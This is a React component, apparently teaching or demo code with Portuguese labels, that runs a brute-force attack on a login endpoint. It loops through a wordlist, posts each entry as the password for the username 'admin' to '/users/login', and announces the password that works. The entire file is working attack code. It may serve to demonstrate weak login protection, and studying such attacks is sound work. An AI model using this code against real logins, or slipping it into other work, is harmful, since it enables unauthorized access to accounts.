import React from 'react'
import wordlist from '../data/wordlist'
import myfetch from '../lib/myfetch'

export default function BruteForce() {
  const [log, setLog] = React.useState([])
  const [stop, setStop] = React.useState(false)
  const [processing, setProcessing] = React.useState(false)

  async function handleStartClick() {
    setProcessing(true)
    for(let i = 0; i < wordlist.length; i++) {
      if(stop) {
        setProcessing(false)
        break
      }
      try {

        const logCopy = [ ...log ]
        logCopy.unshift({
          num: i,
          text: `Tentativa nº ${i} => ${wordlist[i]}`
        })
        setLog(logCopy)

        await myfetch.post('/users/login', {
          username: 'admin',
          password: wordlist[i]
        })
        alert('SENHA ENCONTRADA: ' + wordlist[i])
        break
      }
      catch(error) {
        // Não faz nada
      }
    }
    setProcessing(false)
  }

  return (
    <>
      <h1>Ataque de força bruta no <em>login</em></h1>
      <div style={{
        display: 'flex',
        justifyContent: 'space-around'
      }}>
        <button onClick={handleStartClick} disabled={processing}>
          Iniciar
        </button>
        <button onClick={() => setStop(true)} disabled={!processing}>
          Parar
        </button>
      </div>
      <select size="8">
        {
          log.map(row => (
            <option key={row.num} value={row.text}>{row.text}</option>
          ))
        }
      </select>
    </>
  )
}
